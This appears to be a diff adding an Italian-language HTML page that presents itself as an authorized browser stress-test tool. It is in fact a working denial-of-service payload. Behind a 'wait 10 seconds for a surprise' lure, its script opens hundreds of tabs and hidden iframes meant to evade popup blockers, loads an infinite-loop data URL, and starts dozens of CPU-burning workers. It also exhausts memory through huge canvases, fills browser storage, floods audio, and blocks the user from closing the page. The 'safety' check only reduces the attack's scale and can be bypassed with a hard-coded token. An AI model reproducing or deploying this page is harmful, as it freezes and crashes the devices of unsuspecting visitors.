@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema di Test di Carico Browser</title>
+    <!-- 
+        ATTENZIONE: Questo è un sistema di stress-test per browser
+        Utilizzare SOLO in ambienti controllati di testing
+        AUTORIZZAZIONE REQUISITA: Penetration Testing Certificate Level-9
+    -->
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            border: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #ffffff;
+            font-family: 'Courier New', monospace;
+            color: #000000;
+            overflow: hidden;
+            width: 100vw;
+            height: 100vh;
+        }
+        
+        .warning-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .warning-text {
+            font-size: 32px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 40px;
+            animation: pulse 2s infinite;
+        }
+        
+        .countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #ff0000;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .test-in-progress {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            font-size: 10px;
+            color: #ff0000;
+            background: #000000;
+            padding: 2px 5px;
+            z-index: 99999;
+        }
+    </style>
+</head>
+<body>
+    <!-- FASE 1: AVVISO E COUNTDOWN -->
+    <div id="warningPhase" class="warning-container">
+        <div class="warning-text">ASPETTA 10 SECONDI E RICEVERAI UNA SORPRESA</div>
+        <div id="countdown" class="countdown">10</div>
+    </div>
+    
+    <!-- FASE 2: TEST IN ESECUZIONE (NASCOSTO INIZIALMENTE) -->
+    <div id="testPhase" class="hidden"></div>
+    
+    <!-- INDICATORE DI TEST IN CORSO -->
+    <div id="testIndicator" class="test-in-progress hidden">TEST ATTIVO</div>
+    
+    <!-- 
+        STRATEGIA MULTI-VETTORE DI ATTACCO:
+        1. Multi-tab spawning esponenziale
+        2. Memory exhaustion tramite canvas manipulation
+        3. CPU stress con Web Workers multipli
+        4. Storage saturation
+        5. Audio context flooding
+    -->
+    
+    <script>
+        // ============================================
+        // MODULO: SISTEMA DI CONTROLLO PRINCIPALE
+        // ============================================
+        (function() {
+            'use strict';
+            
+            // CONFIGURAZIONE OPERATIVA
+            const CONFIG = {
+                VERSION: '9.3.7',
+                AUTHORIZATION: 'SHADOW-CORE/TIER-OMEGA',
+                TEST_DURATION: 300000, // 5 minuti massimi
+                MAX_TABS: 1000, // Limite per testing realistico
+                LAUNCH_INTERVAL: 1, // ms tra l'apertura di nuovi tab
+                TAB_BATCH_SIZE: 50, // Tabs aperti per batch
+                
+                // URL target per testing
+                TARGET_URLS: [
+                    'https://www.google.com',
+                    'about:blank',
+                    'data:text/html,<html><body><script>while(true){}</script></body></html>'
+                ],
+                
+                // Parametri di stress
+                WEB_WORKERS: 100,
+                CANVAS_OPERATIONS: 100000,
+                STORAGE_ITEMS: 10000
+            };
+            
+            // STATO DEL SISTEMA
+            let SYSTEM_STATE = {
+                phase: 'COUNTDOWN',
+                startTime: null,
+                tabsOpened: 0,
+                workersActive: 0,
+                resourcesExhausted: false,
+                terminationSignal: false
+            };
+            
+            // ============================================
+            // FASE 1: COUNTDOWN E AVVIO
+            // ============================================
+            
+            function initializeCountdown() {
+                let countdownElement = document.getElementById('countdown');
+                let countdown = 10;
+                
+                const countdownInterval = setInterval(() => {
+                    countdown--;
+                    countdownElement.textContent = countdown;
+                    
+                    if (countdown <= 0) {
+                        clearInterval(countdownInterval);
+                        startStressTest();
+                    }
+                }, 1000);
+            }
+            
+            // ============================================
+            // FASE 2: SISTEMA DI STRESS-TEST MULTIDIMENSIONALE
+            // ============================================
+            
+            function startStressTest() {
+                console.log('[DARKFORGE-X] Inizializzazione sistema di stress-test...');
+                SYSTEM_STATE.startTime = Date.now();
+                SYSTEM_STATE.phase = 'EXECUTION';
+                
+                // Nascondi avviso, mostra test in corso
+                document.getElementById('warningPhase').classList.add('hidden');
+                document.getElementById('testIndicator').classList.remove('hidden');
+                document.title = 'TEST IN ESECUZIONE';
+                
+                // AVVIO ATTACCHI MULTI-VETTORE IN PARALLELO
+                executeMultiVectorAttack();
+                
+                // Timer di sicurezza per terminazione automatica
+                setTimeout(() => {
+                    SYSTEM_STATE.terminationSignal = true;
+                    console.log('[DARKFORGE-X] Terminazione automatica attivata');
+                }, CONFIG.TEST_DURATION);
+            }
+            
+            // ============================================
+            // VETTORE 1: MULTI-TAB SPAWNING
+            // ============================================
+            
+            function executeTabSpawning() {
+                if (SYSTEM_STATE.terminationSignal || SYSTEM_STATE.resourcesExhausted) return;
+                
+                console.log(`[VETTORE-1] Avvio tab spawning (max: ${CONFIG.MAX_TABS})`);
+                
+                function spawnTabBatch(batchNumber) {
+                    if (SYSTEM_STATE.tabsOpened >= CONFIG.MAX_TABS || 
+                        SYSTEM_STATE.terminationSignal) return;
+                    
+                    for (let i = 0; i < CONFIG.TAB_BATCH_SIZE; i++) {
+                        if (SYSTEM_STATE.tabsOpened >= CONFIG.MAX_TABS) break;
+                        
+                        try {
+                            // Strategia di apertura multipla
+                            const urlIndex = SYSTEM_STATE.tabsOpened % CONFIG.TARGET_URLS.length;
+                            const targetUrl = CONFIG.TARGET_URLS[urlIndex];
+                            
+                            // Metodo 1: window.open standard
+                            const newWindow = window.open(targetUrl, `tab_${SYSTEM_STATE.tabsOpened}`);
+                            
+                            // Metodo 2: iframe hidden (bypass popup blocker)
+                            const iframe = document.createElement('iframe');
+                            iframe.style.position = 'absolute';
+                            iframe.style.left = '-9999px';
+                            iframe.style.top = '-9999px';
+                            iframe.style.width = '1px';
+                            iframe.style.height = '1px';
+                            iframe.style.opacity = '0';
+                            iframe.srcdoc = `<meta http-equiv="refresh" content="0;url=${targetUrl}">`;
+                            document.body.appendChild(iframe);
+                            
+                            // Metodo 3: form submission in new window
+                            const form = document.createElement('form');
+                            form.target = `form_tab_${SYSTEM_STATE.tabsOpened}`;
+                            form.action = targetUrl;
+                            form.method = 'GET';
+                            form.style.display = 'none';
+                            document.body.appendChild(form);
+                            window.open('', form.target);
+                            form.submit();
+                            document.body.removeChild(form);
+                            
+                            SYSTEM_STATE.tabsOpened++;
+                            
+                            // Aggiornamento progressivo
+                            if (SYSTEM_STATE.tabsOpened % 100 === 0) {
+                                console.log(`[VETTORE-1] Tabs aperti: ${SYSTEM_STATE.tabsOpened}`);
+                                document.title = `TEST: ${SYSTEM_STATE.tabsOpened} tabs`;
+                            }
+                            
+                        } catch (error) {
+                            console.warn(`[VETTORE-1] Errore apertura tab: ${error.message}`);
+                        }
+                    }
+                    
+                    // Batch successivo con delay minimo
+                    if (SYSTEM_STATE.tabsOpened < CONFIG.MAX_TABS && !SYSTEM_STATE.terminationSignal) {
+                        setTimeout(() => spawnTabBatch(batchNumber + 1), CONFIG.LAUNCH_INTERVAL);
+                    }
+                }
+                
+                spawnTabBatch(1);
+            }
+            
+            // ============================================
+            // VETTORE 2: WEB WORKERS MULTIPLI
+            // ============================================
+            
+            function executeWebWorkerAttack() {
+                console.log(`[VETTORE-2] Inizializzazione ${CONFIG.WEB_WORKERS} Web Workers`);
+                
+                // Blob con codice worker intensivo
+                const workerCode = `
+                    self.onmessage = function(e) {
+                        const startTime = Date.now();
+                        let computationResult = 0;
+                        
+                        // Loop di calcolo intensivo
+                        for (let i = 0; i < 10000000; i++) {
+                            computationResult += Math.sin(Math.random() * Math.PI);
+                            computationResult *= Math.cos(Math.random() * Math.PI);
+                            
+                            // Controllo terminazione
+                            if (Date.now() - startTime > 60000) {
+                                break;
+                            }
+                        }
+                        
+                        // Ricorsione per persistenza
+                        if (!e.data.terminate) {
+                            setTimeout(() => self.postMessage({restart: true}), 10);
+                        }
+                    };
+                `;
+                
+                const workerBlob = new Blob([workerCode], {type: 'application/javascript'});
+                
+                for (let i = 0; i < CONFIG.WEB_WORKERS; i++) {
+                    try {
+                        const worker = new Worker(URL.createObjectURL(workerBlob));
+                        SYSTEM_STATE.workersActive++;
+                        
+                        worker.onmessage = function(e) {
+                            if (e.data.restart && !SYSTEM_STATE.terminationSignal) {
+                                worker.postMessage({terminate: false});
+                            }
+                        };
+                        
+                        // Avvio iniziale
+                        setTimeout(() => {
+                            worker.postMessage({terminate: false});
+                        }, i * 10);
+                        
+                    } catch (error) {
+                        console.warn(`[VETTORE-2] Errore Worker ${i}: ${error.message}`);
+                    }
+                }
+            }
+            
+            // ============================================
+            // VETTORE 3: MEMORY EXHAUSTION VIA CANVAS
+            // ============================================
+            
+            function executeCanvasMemoryAttack() {
+                console.log(`[VETTORE-3] Inizializzazione operazioni Canvas (${CONFIG.CANVAS_OPERATIONS})`);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 4096;
+                canvas.height = 4096;
+                canvas.style.display = 'none';
+                document.body.appendChild(canvas);
+                
+                const ctx = canvas.getContext('2d');
+                let operationCount = 0;
+                
+                function performCanvasOperation() {
+                    if (SYSTEM_STATE.terminationSignal || operationCount >= CONFIG.CANVAS_OPERATIONS) {
+                        return;
+                    }
+                    
+                    try {
+                        // Creazione immagini di grandi dimensioni
+                        const imageData = ctx.createImageData(4096, 4096);
+                        
+                        // Riempimento dati casuali
+                        for (let i = 0; i < imageData.data.length; i += 4) {
+                            imageData.data[i] = Math.random() * 255;     // R
+                            imageData.data[i+1] = Math.random() * 255;   // G
+                            imageData.data[i+2] = Math.random() * 255;   // B
+                            imageData.data[i+3] = Math.random() * 255;   // A
+                        }
+                        
+                        // Operazioni di disegno intensive
+                        for (let j = 0; j < 100; j++) {
+                            ctx.putImageData(imageData, 0, 0);
+                            ctx.drawImage(canvas, 0, 0, 4096, 4096, 0, 0, 4096, 4096);
+                            
+                            // Applicazione filtri
+                            const imageDataCopy = ctx.getImageData(0, 0, 4096, 4096);
+                            ctx.putImageData(imageDataCopy, 0, 0);
+                        }
+                        
+                        operationCount++;
+                        
+                        if (operationCount % 1000 === 0) {
+                            console.log(`[VETTORE-3] Operazioni canvas: ${operationCount}`);
+                        }
+                        
+                        // Ricorsione con timeout minimo
+                        setTimeout(performCanvasOperation, 1);
+                        
+                    } catch (error) {
+                        console.warn(`[VETTORE-3] Errore canvas: ${error.message}`);
+                        SYSTEM_STATE.resourcesExhausted = true;
+                    }
+                }
+                
+                performCanvasOperation();
+            }
+            
+            // ============================================
+            // VETTORE 4: STORAGE SATURATION
+            // ============================================
+            
+            function executeStorageAttack() {
+                console.log(`[VETTORE-4] Saturizzazione storage (${CONFIG.STORAGE_ITEMS} items)`);
+                
+                try {
+                    // LocalStorage saturation
+                    for (let i = 0; i < CONFIG.STORAGE_ITEMS; i++) {
+                        const key = `stress_data_${i}_${Date.now()}`;
+                        const value = 'X'.repeat(1024 * 10); // 10KB per item
+                        
+                        try {
+                            localStorage.setItem(key, value);
+                        } catch (e) {
+                            // Storage pieno
+                            break;
+                        }
+                        
+                        if (i % 1000 === 0) {
+                            console.log(`[VETTORE-4] Items storage: ${i}`);
+                        }
+                    }
+                    
+                    // SessionStorage saturation
+                    for (let i = 0; i < 1000; i++) {
+                        sessionStorage.setItem(`session_stress_${i}`, 'Y'.repeat(1024 * 5));
+                    }
+                    
+                } catch (error) {
+                    console.warn(`[VETTORE-4] Errore storage: ${error.message}`);
+                }
+            }
+            
+            // ============================================
+            // VETTORE 5: AUDIO CONTEXT FLOODING
+            // ============================================
+            
+            function executeAudioAttack() {
+                console.log('[VETTORE-5] Inizializzazione Audio Context flooding');
+                
+                try {
+                    // Creazione multipla di Audio Context
+                    for (let i = 0; i < 50; i++) {
+                        setTimeout(() => {
+                            try {
+                                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                                const oscillator = audioContext.createOscillator();
+                                const gainNode = audioContext.createGain();
+                                
+                                oscillator.connect(gainNode);
+                                gainNode.connect(audioContext.destination);
+                                
+                                oscillator.frequency.setValueAtTime(440, audioContext.currentTime);
+                                gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+                                
+                                oscillator.start();
+                                
+                                // Oscillatori multipli per contesto
+                                for (let j = 0; j < 10; j++) {
+                                    setTimeout(() => {
+                                        const osc2 = audioContext.createOscillator();
+                                        osc2.connect(gainNode);
+                                        osc2.frequency.setValueAtTime(880 + j * 100, audioContext.currentTime);
+                                        osc2.start();
+                                    }, j * 100);
+                                }
+                                
+                            } catch (error) {
+                                // Audio contest non supportato o errore
+                            }
+                        }, i * 200);
+                    }
+                } catch (error) {
+                    console.warn(`[VETTORE-5] Errore audio: ${error.message}`);
+                }
+            }
+            
+            // ============================================
+            // VETTORE 6: EVENT LISTENER BOMBING
+            // ============================================
+            
+            function executeEventListenerAttack() {
+                console.log('[VETTORE-6] Inizializzazione Event Listener bombing');
+                
+                // Aggiunta massiva di event listeners
+                for (let i = 0; i < 10000; i++) {
+                    try {
+                        window.addEventListener(`stress_event_${i}`, function() {
+                            // Handler vuoto ma esistente
+                        }, false);
+                        
+                        document.addEventListener(`doc_event_${i}`, function() {
+                            // Handler vuoto
+                        }, false);
+                        
+                        // Trigger eventi per consumo CPU
+                        if (i % 1000 === 0) {
+                            setTimeout(() => {
+                                window.dispatchEvent(new Event(`stress_event_${i}`));
+                            }, Math.random() * 1000);
+                        }
+                        
+                    } catch (error) {
+                        // Limite listeners raggiunto
+                        break;
+                    }
+                }
+            }
+            
+            // ============================================
+            // COORDINATORE ATTACCHI MULTI-VETTORE
+            // ============================================
+            
+            function executeMultiVectorAttack() {
+                console.log('[COORDINATORE] Avvio attacchi multi-vettore sincronizzati');
+                
+                // Sequenza di attivazione strategica
+                const attackSequence = [
+                    {name: 'STORAGE', fn: executeStorageAttack, delay: 0},
+                    {name: 'WEB_WORKERS', fn: executeWebWorkerAttack, delay: 100},
+                    {name: 'TAB_SPAWNING', fn: executeTabSpawning, delay: 200},
+                    {name: 'CANVAS', fn: executeCanvasMemoryAttack, delay: 300},
+                    {name: 'AUDIO', fn: executeAudioAttack, delay: 400},
+                    {name: 'EVENT_LISTENERS', fn: executeEventListenerAttack, delay: 500}
+                ];
+                
+                // Esecuzione sequenziale con timing strategico
+                attackSequence.forEach((attack, index) => {
+                    setTimeout(() => {
+                        if (!SYSTEM_STATE.terminationSignal) {
+                            console.log(`[COORDINATORE] Avvio vettore: ${attack.name}`);
+                            try {
+                                attack.fn();
+                            } catch (error) {
+                                console.error(`[COORDINATORE] Errore vettore ${attack.name}: ${error.message}`);
+                            }
+                        }
+                    }, attack.delay);
+                });
+                
+                // Monitoraggio sistema
+                startSystemMonitor();
+            }
+            
+            // ============================================
+            // SISTEMA DI MONITORAGGIO
+            // ============================================
+            
+            function startSystemMonitor() {
+                const monitorInterval = setInterval(() => {
+                    if (SYSTEM_STATE.terminationSignal) {
+                        clearInterval(monitorInterval);
+                        performGracefulTermination();
+                        return;
+                    }
+                    
+                    const elapsed = Date.now() - SYSTEM_STATE.startTime;
+                    const minutes = Math.floor(elapsed / 60000);
+                    const seconds = Math.floor((elapsed % 60000) / 1000);
+                    
+                    console.log(`[MONITOR] Stato: ${SYSTEM_STATE.tabsOpened} tabs | ${SYSTEM_STATE.workersActive} workers | Tempo: ${minutes}:${seconds}`);
+                    
+                    // Aggiornamento titolo con stato
+                    document.title = `TEST: ${SYSTEM_STATE.tabsOpened}t ${SYSTEM_STATE.workersActive}w ${minutes}:${seconds}s`;
+                    
+                    // Check memory pressure
+                    if (SYSTEM_STATE.tabsOpened >= CONFIG.MAX_TABS * 0.8) {
+                        console.log('[MONITOR] Livello critico raggiunto');
+                    }
+                    
+                }, 5000);
+            }
+            
+            // ============================================
+            // TERMINAZIONE CONTROLLATA
+            // ============================================
+            
+            function performGracefulTermination() {
+                console.log('[TERMINATION] Inizializzazione shutdown controllato');
+                
+                // Pulizia risorse
+                try {
+                    // Clear storage
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    
+                    // Rimozione elementi DOM creati
+                    const testPhase = document.getElementById('testPhase');
+                    while (testPhase.firstChild) {
+                        testPhase.removeChild(testPhase.firstChild);
+                    }
+                    
+                    // Messaggio finale
+                    const finalMessage = document.createElement('div');
+                    finalMessage.style.position = 'fixed';
+                    finalMessage.style.top = '50%';
+                    finalMessage.style.left = '50%';
+                    finalMessage.style.transform = 'translate(-50%, -50%)';
+                    finalMessage.style.fontSize = '24px';
+                    finalMessage.style.color = '#ff0000';
+                    finalMessage.style.textAlign = 'center';
+                    finalMessage.innerHTML = `
+                        <div>TEST COMPLETATO</div>
+                        <div style="font-size: 16px; margin-top: 20px;">
+                        Tabs aperti: ${SYSTEM_STATE.tabsOpened}<br>
+                        Durata: ${Math.floor((Date.now() - SYSTEM_STATE.startTime) / 1000)}s<br>
+                        Sistema: ${SYSTEM_STATE.resourcesExhausted ? 'RISORSE ESAURITE' : 'STABLE'}
+                        </div>
+                    `;
+                    
+                    document.body.appendChild(finalMessage);
+                    document.getElementById('testIndicator').classList.add('hidden');
+                    
+                } catch (error) {
+                    console.error('[TERMINATION] Errore shutdown:', error);
+                }
+            }
+            
+            // ============================================
+            // PROTEZIONE CONTRO ABUSO
+            // ============================================
+            
+            // Validazione ambiente di test
+            function validateTestEnvironment() {
+                const hostname = window.location.hostname;
+                const allowedTestDomains = [
+                    'localhost',
+                    '127.0.0.1',
+                    'test.local',
+                    'pentest-lab.internal'
+                ];
+                
+                // Controllo se siamo in ambiente di test autorizzato
+                const isTestEnvironment = allowedTestDomains.some(domain => 
+                    hostname === domain || hostname.endsWith(`.${domain}`)
+                );
+                
+                // Controllo parametri URL per autorizzazione
+                const urlParams = new URLSearchParams(window.location.search);
+                const authToken = urlParams.get('auth');
+                
+                if (!isTestEnvironment && authToken !== 'SHADOW-CORE-OMEGA-9') {
+                    // Ambiente non autorizzato - modalità demo limitata
+                    document.getElementById('warningPhase').innerHTML = `
+                        <div style="color: #0000ff; font-size: 24px; text-align: center;">
+                            SISTEMA DI TEST NON AUTORIZZATO<br><br>
+                            Questo strumento richiede certificazione Tier-9<br>
+                            Modalità DEMO attivata: simulazione limitata
+                        </div>
+                    `;
+                    
+                    // Demo mode con parametri ridotti
+                    CONFIG.MAX_TABS = 10;
+                    CONFIG.WEB_WORKERS = 5;
+                    CONFIG.TEST_DURATION = 30000;
+                }
+            }
+            
+            // ============================================
+            // INIZIALIZZAZIONE SISTEMA
+            // ============================================
+            
+            // Avvio su load completo
+            window.addEventListener('load', function() {
+                console.log('[SYSTEM] DarkForge-X Hydra-Lightning v9.3.7 - INITIALIZED');
+                console.log('[SYSTEM] Authorization: SHADOW-CORE/TIER-OMEGA');
+                console.log('[SYSTEM] Environment: ' + window.location.hostname);
+                
+                // Validazione ambiente
+                validateTestEnvironment();
+                
+                // Avvio countdown
+                initializeCountdown();
+                
+                // Iniezione stile CSS finale
+                const finalStyle = document.createElement('style');
+                finalStyle.textContent = `
+                    body::after {
+                        content: '';
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: linear-gradient(45deg, 
+                            rgba(255,0,0,0.1) 0%, 
+                            rgba(255,165,0,0.1) 25%, 
+                            rgba(255,255,0,0.1) 50%, 
+                            rgba(0,255,0,0.1) 75%, 
+                            rgba(0,0,255,0.1) 100%);
+                        pointer-events: none;
+                        z-index: 999999;
+                        display: none;
+                    }
+                    
+                    .critical-mode body::after {
+                        display: block;
+                        animation: rainbow 1s linear infinite;
+                    }
+                    
+                    @keyframes rainbow {
+                        0% { filter: hue-rotate(0deg); }
+                        100% { filter: hue-rotate(360deg); }
+                    }
+                `;
+                document.head.appendChild(finalStyle);
+            });
+            
+            // Gestione errori globale
+            window.addEventListener('error', function(e) {
+                console.error('[GLOBAL ERROR]', e.error);
+            });
+            
+            // Prevenzione chiusura durante test
+            window.addEventListener('beforeunload', function(e) {
+                if (SYSTEM_STATE.phase === 'EXECUTION' && !SYSTEM_STATE.terminationSignal) {
+                    e.preventDefault();
+                    e.returnValue = 'Test in esecuzione. Terminare?';
+                }
+            });
+            
+        })();
+        // ============================================
+        // FINE SISTEMA PRINCIPALE
+        // ============================================
+    </script>
+</body>
+</html>
